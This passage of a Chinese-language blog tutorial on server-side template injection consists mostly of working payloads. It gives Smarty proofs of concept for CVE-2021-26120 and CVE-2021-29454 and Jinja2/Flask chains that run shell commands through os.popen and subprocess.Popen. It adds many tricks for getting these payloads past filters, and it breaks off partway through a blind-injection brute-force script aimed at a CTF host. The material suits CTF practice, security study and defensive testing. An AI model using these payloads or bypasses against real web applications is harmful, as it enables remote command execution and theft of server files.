+<h4 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h4><p>在注入点传入 <code>&#123;$smarty.version&#125;</code> 就能看见smarty版本号，这对接下来的利用有帮助</p>
+<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-23-%E4%B8%8B%E5%8D%888.19.28.png" alt="img"></p>
+<h5 id="PHP函数直接使用"><a href="#PHP函数直接使用" class="headerlink" title="PHP函数直接使用"></a>PHP函数直接使用</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;system(&#x27;whoami&#x27;)&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="literal-标签"><a href="#literal-标签" class="headerlink" title="{literal} 标签"></a>{literal} 标签</h5><p><code>&#123;literal&#125;...&#123;/literal&#125;</code> 内的任何标签都不会被解析，会保持原样输出。php7无法使用，但是对于php5的环境就可以使用如下脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;literal&#125;&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt;&#123;/literal&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="include-标签"><a href="#include-标签" class="headerlink" title="{include} 标签"></a>{include} 标签</h5><p><code>&#123;include&#125;</code> 标签引入的文件只会单纯的输出文件内容，就算引入 php 文件也是如此，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;include file=&#x27;index.php&#x27;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-23-%E4%B8%8B%E5%8D%889.00.18.png" alt="img"></p>
+<p>虽然被不能完整的显示，但是还是可以看到读到了php代码</p>
+<h5 id="获取类的静态方法"><a href="#获取类的静态方法" class="headerlink" title="获取类的静态方法"></a><strong>获取类的静态方法</strong></h5><p>我们可以通过 self 标签来获取 Smarty 类的静态方法，比如我们可以获取 getStreamVariable 方法来读文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这个方法可以读取一个文件并返回其内容，但是在3.1.30的Smarty版本中官方已经把该静态方法删除。 对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p>
+<h5 id="CVE-2021-26120"><a href="#CVE-2021-26120" class="headerlink" title="CVE-2021-26120"></a>CVE-2021-26120</h5><ul>
+<li>POC：<code>string:&#123;function name=&#39;x()&#123;&#125;;system(whoami);function &#39;&#125;&#123;/function&#125;</code></li>
+<li>漏洞原因：<a target="_blank" rel="noopener" href="https://www.smarty.net/docs/en/language.function.function.tpl">{function}</a> 标签的 name 属性可以通过精心构造注入恶意代码</li>
+<li>版本限制：&lt; 3.1.39</li>
+</ul>
+<h5 id="CVE-2021-29454"><a href="#CVE-2021-29454" class="headerlink" title="CVE-2021-29454"></a>CVE-2021-29454</h5><ul>
+<li>POC：<br><code>eval:&#123;math equation=&#39;(&quot;\163\171\163\164\145\155&quot;)(&quot;\167\150\157\141\155\151&quot;)&#39;&#125;</code></li>
+<li>漏洞原因：<code>libs/plugins/function.math.php</code> 中的 <code>smarty_function_math</code> 执行了 eval()，而 eval() 的数据可以通过 8 进制数字绕过正则表达式</li>
+<li>版本限制：在 3.1.42 和 4.0.2 中修复，小于这两个版本可用</li>
+</ul>
+<p>php 的 eval() 支持传入 8 或 16 进制数据，以下代码在 php7 版本都可以顺利执行，由于 php5 不支持 <code>(system)(whoami);</code> 这种方式执行代码，所以 php5 的 8 进制方式用不了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(&#x27;(&quot;\163\171\163\164\145\155&quot;)(&quot;\167\150\157\141\155\151&quot;);&#x27;);</span><br><span class="line">eval(&quot;\x73\x79\x73\x74\x65\x6d\x28\x77\x68\x6f\x61\x6d\x69\x29\x3b&quot;);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Python中的SSTI"><a href="#Python中的SSTI" class="headerlink" title="Python中的SSTI"></a>Python中的SSTI</h2><h3 id="Jinja"><a href="#Jinja" class="headerlink" title="Jinja"></a>Jinja</h3><p>Jinja 是 Python 中流行的模板引擎。 它是一个与 Django 非常相似的模板。 与 Django 相比，Jinja 可以轻松地在运行时动态使用。</p>
+<h4 id="基础语法-2"><a href="#基础语法-2" class="headerlink" title="基础语法"></a>基础语法</h4><p>这里有几个简单的表达式来说明基本语法。</p>
+<p>变量: <code>&#123;&#123; ... &#125;&#125;</code></p>
+<p>语句: <code>&#123;% ... %&#125;</code></p>
+<p>过滤器: <code>&#123;&#123; ...|... &#125;&#125;</code></p>
+<p>更多规则参考： <a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.1.x/templates/">Jinja 官方文档</a></p>
+<h4 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h4><p>在Python里，所有的东西都是对象的概念。不同级别的对象有不同的内置属性。jinja 中是可以直接访问python的一些对象及其方法和内置属性的，所以可以通过内置属性和方法构造继承链来执行一些操作，比如文件读取，命令执行等。SSTI中常用内置属性：</p>
+<p><strong>class</strong>的内置属性：</p>
+<p><code>__dict__</code> ：类的静态函数、类函数、普通函数、全局变量以及一些内置的属性的键值对字典 </p>
+<p><code>__bases__</code> ：以元组形式返回一个类直接所继承的类（可以理解为直接父类）</p>
+<p><code>__base__</code> ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组（__base__和__mro__都是用来寻找基类的） </p>
+<p><code>__subclasses__</code>：以列表返回类的子类</p>
+<p><code>__init__</code> ：类的初始化方法</p>
+<p><strong>instance</strong>的内置属性：</p>
+<p><code>__class__</code> ：返回一个对象所属的类 </p>
+<p><code>__mro__</code> ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 </p>
+<p><strong>function</strong>的内置属性：</p>
+<p><code>__globals__</code> ：返回函数所在的全局命名空间所定义的全局变量(包括class，module，function等)的字典</p>
+<p><strong>module</strong>的内置属性：</p>
+<p><code>__builtin__</code> &amp;&amp; <code>__builtins__</code> ：python中可以直接运行一些函数，例如int()，list()等等。这些函数可以在__builtin__可以查到。查看的方法是dir(<strong>builtins</strong>)。在py3中__builtin__被换成了builtin</p>
+<ol>
+<li>在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　</li>
+<li>非主模块main中，<strong>builtins__仅是对__builtin</strong>.__dict__的引用，而非__builtin__本身</li>
+</ol>
+<p>例如可以通过 <code>__class__</code> 获取字典对象所属的类，再通过 <code>__base__</code> 拿到基类，然后使用<code>__subclasses__()</code> 获取子类列表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;&#125;.__class__.__base__.__subclasses__():</span><br><span class="line">    print(i.__name__)</span><br></pre></td></tr></table></figure>
+
+<p>上述代码如果按照jinja的规则就可以写成这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for item in &#123;&#125;.__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &quot;&#123;&#123;item.__name__&#125;&#125;&quot;&lt;br&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入有漏洞的地方就能获取到类列表</p>
+<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-24-%E4%B8%8B%E5%8D%884.55.47.png" alt="img"></p>
+<p>通过上述方式获取到类后，可以获取 <code>__init__</code> 函数，然后使用 <code>__globals__</code> 获取到全局变量，在全局变量中就包含 <code>__builtins__</code> 这个module，其中包含了内建函数，如chr，eval等。也可以直接使用内置方法，通过上述途径得到内建函数。这里用两种方法来演示</p>
+<p>使用搜索到的类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.__class__.__base__.__subclasses__()[250].__init__.__globals__.__builtins__.eval(&#x27;import &quot;os&quot; os.popen(&quot;ls&quot;).read()&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">//假设250这个类的初始化函数所在__globals__不包含os模块。然后它就得使用内建函数eval来导入os模块来执行命令</span><br></pre></td></tr></table></figure>
+
+<p>flask方法 <code>lipsum</code> 自带os module，可以直接使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__.os.popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flask还有如下方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url_for                url_for.__globals__含有current_app</span><br><span class="line">get_flashed_messages   get_flashed_messages.__globals__含有current_app</span><br><span class="line">lipsum                 lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里也提供一些可能会用到的变量&#x2F;类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line">request              可以用于获取字符串来绕过</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line"></span><br><span class="line">cycler               &#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;id&#x27;).read()&#125;&#125;</span><br><span class="line">joiner               &#123;&#123;joiner.__init__.__globals__.os.popen(&#x27;id&#x27;).read()&#125;&#125;</span><br><span class="line">namespace            &#123;&#123;namespace.__init__.__globals__.os.popen(&#x27;id&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用file对象读取文件"><a href="#利用file对象读取文件" class="headerlink" title="利用file对象读取文件"></a>利用file对象读取文件</h5><p>python2可用，python3已经移除内置file对象</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for c in [].__class__.__base__.__subclasses__():</span><br><span class="line">    if(c.__name__==&#x27;file&#x27;):</span><br><span class="line">        print(c(&#x27;flag.txt&#x27;).readlines())</span><br></pre></td></tr></table></figure>
+
+<p>按照jinja2语法写：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__==&#x27;file&#x27; %&#125;</span><br><span class="line">&#123;&#123; c(&quot;flag.txt&quot;).readlines() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>读取文件</p>
+<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-24-%E4%B8%8B%E5%8D%887.44.53.png" alt="img"></p>
+<h5 id="使用-subprocess-Popen-类执行命令"><a href="#使用-subprocess-Popen-类执行命令" class="headerlink" title="使用 subprocess.Popen 类执行命令"></a>使用 subprocess.Popen 类执行命令</h5><p>首先要找到这个类的索引，然后执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[407](&#x27;whoami&#x27;,shell=True,stdout=-1).communicate()[0]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="搜索想要的模块或函数"><a href="#搜索想要的模块或函数" class="headerlink" title="搜索想要的模块或函数"></a>搜索想要的模块或函数</h5><p>一般用 <code>__globals__</code> (func_globals等价)来搜索</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">search = &#x27;os&#x27;   #也可以是其他你想利用的模块</span><br><span class="line">num = -1</span><br><span class="line">for i in ().__class__.__bases__[0].__subclasses__():</span><br><span class="line">    num += 1</span><br><span class="line">    try:</span><br><span class="line">        if search in i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    except:</span><br><span class="line">        pass </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-24-%E4%B8%8B%E5%8D%8810.45.15.png" alt="img"></p>
+<p>找到后构造变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[137].__init__.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-27-%E4%B8%8B%E5%8D%888.27.48.png" alt="img"></p>
+<h4 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h4><h5 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h5><p><strong>使用chr函数</strong></p>
+<p>使用chr函数传入字符串，就可以不使用引号。但是jinja中不能直接使用chr之类的内置函数，得先获取到包含它的引用，可以搜索，也可以用flask的方法。这里用url_for方法。然后利用set语句自定义一个chr函数的引用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=url_for.__globals__.__builtins__.chr %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后可以使用将字符串生成chr函数表达式的脚本，快速生成代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string=&#x27;ls&#x27;</span><br><span class="line">for c in string:</span><br><span class="line">    print(&#x27;chr(&#123;&#125;)~&#x27;.format(ord(c)),end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">// Output:chr(108)+chr(115)+</span><br></pre></td></tr></table></figure>
+
+<p>最终的payload(注意加号 <code>+</code> 的url编码，或者使用~)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=url_for.__globals__.__builtins__.chr %&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.os.popen(chr(108)~chr(115)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用request对象</strong></p>
+<p>使用 <code>request</code> 对象可以获取传入的参数，将其传入需要使用引号输入字符串的地方。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">request.args</span><br><span class="line">request.cookies</span><br><span class="line">request.headers</span><br><span class="line">request.values</span><br><span class="line">request.form</span><br></pre></td></tr></table></figure>
+
+<p>如果过滤了args，可以将其中的 <code>request.args</code> 改为其他变量，只要在相应的地方传入参数即可。传入的时候注意参数的名字，例如request.args.get就是不行的，因为已经是内置的方法了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[407](request.args.cmd,shell=True,stdout=-1).communicate()[0]&#125;&#125;&amp;cmd=ls</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用config|string|list</strong></p>
+<p>这是利用config变量中包含的字符，转成字符串，再转换成列表，通过索引就能获得config包含的所有字符里的单个字符。查看所有能从config里获得的字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config|string|list&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后使用~或者+连接，就能的到一定的字符串。不一定要使用config，用其他能访问到的变量也可以，只不过config包含的字符多。也可以配合chr使用，这样的话能获取所有ascii字符。</p>
+<p>生成脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">def findCharInConfig(char,config):</span><br><span class="line">    for i in range(len(config)):</span><br><span class="line">        if(config[i]==char):</span><br><span class="line">            return i</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">payload=&#x27;ls&#x27;</span><br><span class="line">config=&quot;&lt;Config &#123;&#x27;ENV&#x27;: &#x27;production&#x27;, &#x27;DEBUG&#x27;: False, &#x27;TESTING&#x27;: False, &#x27;PROPAGATE_EXCEPTIONS&#x27;: None, &#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;: None, &#x27;SECRET_KEY&#x27;: None, &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(days=31), &#x27;USE_X_SENDFILE&#x27;: False, &#x27;SERVER_NAME&#x27;: None, &#x27;APPLICATION_ROOT&#x27;: &#x27;/&#x27;, &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;, &#x27;SESSION_COOKIE_DOMAIN&#x27;: None, &#x27;SESSION_COOKIE_PATH&#x27;: None, &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True, &#x27;SESSION_COOKIE_SECURE&#x27;: False, &#x27;SESSION_COOKIE_SAMESITE&#x27;: None, &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True, &#x27;MAX_CONTENT_LENGTH&#x27;: None, &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: datetime.timedelta(seconds=43200), &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: None, &#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False, &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False, &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;, &#x27;JSON_AS_ASCII&#x27;: True, &#x27;JSON_SORT_KEYS&#x27;: True, &#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;: False, &#x27;JSONIFY_MIMETYPE&#x27;: &#x27;application/json&#x27;, &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None, &#x27;MAX_COOKIE_SIZE&#x27;: 4093&#125;&gt;&quot;.lower()</span><br><span class="line">for c in payload:</span><br><span class="line">    print(&#x27;(config|string|list).pop(&#123;&#125;).lower()~&#x27;.format(findCharInConfig(c,config)),end=&#x27;&#x27;)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure>
+
+<p>最终的payload，不过还是建议配合chr使用，即用此方法生成chr函数，避免config里没有想要的字符。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[407]((config|string|list).pop(41).lower()~(config|string|list).pop(42).lower(),shell=True,stdout=-1).communicate()[0]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用dict+join</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict(__globals__=a)|join</span><br></pre></td></tr></table></figure>
+
+<p>如上表达式就能返回字符串”<strong>globals</strong>“，也可以使字符分开：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict(o=a,s=a)|join</span><br></pre></td></tr></table></figure>
+
+<p>返回的就是”os”</p>
+<p><strong>利用内置过滤器产生任意字符</strong></p>
+<p>这个方法利用的是构造出’%c’字符串，然后利用python的 <code>&#39;%c&#39;%(number)</code> 的语法来构造任意字符</p>
+<p>利用flask的g对象，可以得到’%’：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set pc = g|lower|list|first|urlencode|first%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后得到’c’：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set c=dict(c=1).keys()|reverse|first%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>合并二者得到’%c’：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set udl=dict(a=pc,c=c).values()|join %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后可以得到任意字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set udl2=udl%(95)%&#125;&#123;&#123;udl&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>合起来的payload就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set pc = g|lower|list|first|urlencode|first%&#125;&#123;%set c=dict(c=1).keys()|reverse|first%&#125;&#123;%set udl=dict(a=pc,c=c).values()|join %&#125;&#123;%set udl2=udl%(95)%&#125;&#123;&#123;udl&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="中括号"><a href="#中括号" class="headerlink" title="中括号"></a>中括号</h5><p>可以使用 <code>__getitem__()</code> 或者 <code>pop()</code> 方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(220)(&#x27;whoami&#x27;,shell=True,stdout=-1).communicate()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="下划线和点"><a href="#下划线和点" class="headerlink" title="下划线和点"></a>下划线和点</h5><p>jinja中可以使用如下方式获取属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;()[&quot;__class__&quot;]&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(&quot;__class__&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;getattr(&#x27;&#x27;,&quot;__class__&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;().__getattribute__(&quot;__class__&quot;)&#125;&#125; 实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br></pre></td></tr></table></figure>
+
+<p>根据实际情况可以配合request对象来使用，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set v=request.values %&#125;</span><br><span class="line">&#123;&#123;()|attr(v.class)|attr(v.base)|attr(v.sub)()|attr(v.geti)(407)(v.cmd,shell=True,stdout=-1)|attr(v.com)()&#125;&#125;&amp;class=__class__&amp;base=__base__&amp;sub=__subclasses__&amp;geti=__getitem__&amp;cmd=cat /flag&amp;com=communicate</span><br></pre></td></tr></table></figure>
+
+<h5 id="双大括号"><a href="#双大括号" class="headerlink" title="双大括号"></a>双大括号</h5><p>可以使用 <code>&#123;% print() %&#125;</code> 语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print(().__class__.__base__.__subclasses__()[407](&#x27;whoami&#x27;,shell=True,stdout=-1).communicate()[0]) %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也可以使用 <code>&#123;% if ... %&#125;1&#123;% endif %&#125;</code> 配合 <code>os.popen</code> 和 <code>curl</code> 将执行结果外带（不外带的话无回显）出来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;ls /&#x27; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还有for语句也可以，请发挥想象。</p>
+<h5 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h5><p>利用dict生成字典，然后join获取字典里key的字符串，再用length或者count获取长度。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set num=dict(aaaaaaaaaaaa=a)|join|length%&#125;</span><br><span class="line"></span><br><span class="line">// num=12</span><br></pre></td></tr></table></figure>
+
+<p>也可以使用unicode字符：<code>𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗</code>，<code>𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡</code>，<code>０１２３４５６７８９</code></p>
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>一般是对单个字符进行判断，页面返回有是或者不是两种结果，根据页面返回判断。然后通过脚本获取所有字符。</p>
+<p>可以用index方法，后面两个参数代表判断范围，如下whoami的结果的0-3index内有t就返回t在字符串中的位置，没有的话页面会返回错误。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% lipsum.__globals__.os.popen(&#x27;whoami&#x27;).read().index(&quot;t&quot;,0,3) %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也可以使用if语句，结果第一个字符是r页面就有1，不是则无。不使用 <code>==</code> 用 <code>in</code> 也可以。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#x27;r&#x27; == lipsum.__globals__.os.popen(&#x27;whoami&#x27;).read()[0] %&#125;Mark&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提供一个脚本（用不同的payload需要对脚本稍加修改）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">#判断长度，方便后续结束请求</span><br><span class="line">length=20</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    payload=&#x27;http://node4.buuoj.cn:26692/?name=&#123;%if().__class__.__base__.__subclasses__()[245](&quot;whoami&quot;,shell=True,stdout=-1).communicate()[0]|string|length==&#x27;+str(i)+&#x27;%&#125;Mark&#123;%endif%&#125;&#x27;</span><br><span class="line">    res=requests.get(payload)</span><br><span class="line">        #print(c,res.text)</span><br><span class="line">    if &#x27;Mark&#x27; in res.text:</span><br><span class="line">        print(&#x27;length:&#x27;,i)</span><br><span class="line">        length=i</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(0,length):</span><br><span class="line">    for c in range(32,127):</span><br><span class="line">        payload=&#x27;http://node4.buuoj.cn:26692/?name=&#123;%if().__class__.__base__.__subclasses__()[245](&quot;whoami&quot;,shell=True,stdout=-1).communicate()[0][&#x27;+str(i)+&#x27;]==&#x27;+str(c)+&#x27;%&#125;Mark&#123;%endif%&#125;&#x27;</span><br><span class="line">        res=requests.get(payload)</span><br><span class="line">        